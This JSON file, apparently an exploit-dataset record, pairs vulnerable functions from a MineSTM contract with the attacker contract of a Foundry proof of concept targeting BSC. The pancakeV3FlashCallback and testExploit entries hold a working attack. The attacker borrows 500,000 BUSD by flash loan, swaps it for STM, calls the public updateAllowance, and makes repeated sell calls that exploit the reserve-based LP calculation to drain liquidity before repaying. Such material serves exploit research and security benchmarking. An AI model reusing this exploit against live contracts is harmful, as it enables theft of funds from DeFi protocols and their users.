[
  {
    "contract/interface": "IMineSTM",
    "source_type": "victim_contract",
    "function_name": "sell",
    "original_code": "    function sell(uint256 amount) external {\n        eve_token_erc20.transferFrom(msg.sender, address(this), amount);\n        (, uint256 r1, ) = inner_pair.getReserves();\n        uint256 lpAmount = amount*inner_pair.totalSupply()/(2*r1);\n        uniswapV2Router.removeLiquidity(address(usdt_token_erc20),address(eve_token_erc20),lpAmount,0,0,msg.sender,block.timestamp);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMineSTM",
    "source_type": "victim_contract",
    "function_name": "updateAllowance",
    "original_code": "    function updateAllowance() public {\n        usdt_token_erc20.approve(address(uniswapV2Router), type(uint256).max);\n        eve_token_erc20.approve(address(uniswapV2Router), type(uint256).max);\n        inner_pair.approve(address(uniswapV2Router), type(uint256).max);\n    }\n\n    //Calculate team level\n",
    "description": ""
  },
  {
    "contract/interface": "ICake_LP",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256, uint256, bytes memory) external {\n        IERC20(BUSD).approve(PancakeRouter, type(uint256).max);\n\n        uint256 balance = IERC20(BUSD).balanceOf(address(this));\n        address[] memory path = new address[](2);\n        path[0] = BUSD;\n        path[1] = STM;\n        IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            balance, 0, path, address(this), 1_717_695_757\n        );\n        IMineSTM(MineSTM).updateAllowance();\n        IERC20(STM).approve(MineSTM, type(uint256).max);\n\n        IMineSTM(MineSTM).sell(788_457_284_784_675_531_947_146);\n        IMineSTM(MineSTM).sell(58_404_243_317_383_372_736_827);\n        IMineSTM(MineSTM).sell(4_326_240_245_732_101_684_211);\n        IMineSTM(MineSTM).sell(32_046_224_042_460_012_475);\n\n        IERC20(BUSD).transfer(PancakeV3Pool, 500_050_000_000_000_000_000_000);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(BUSD);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SteamSwap",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        ICake_LP(Cake_LP).sync();\n        uint256 amount0 = 500_000_000_000_000_000_000_000;\n        IPancakeV3PoolActions(PancakeV3Pool).flash(address(this), amount0, 0, \"\");\n    }\n\n",
    "description": ""
  }
]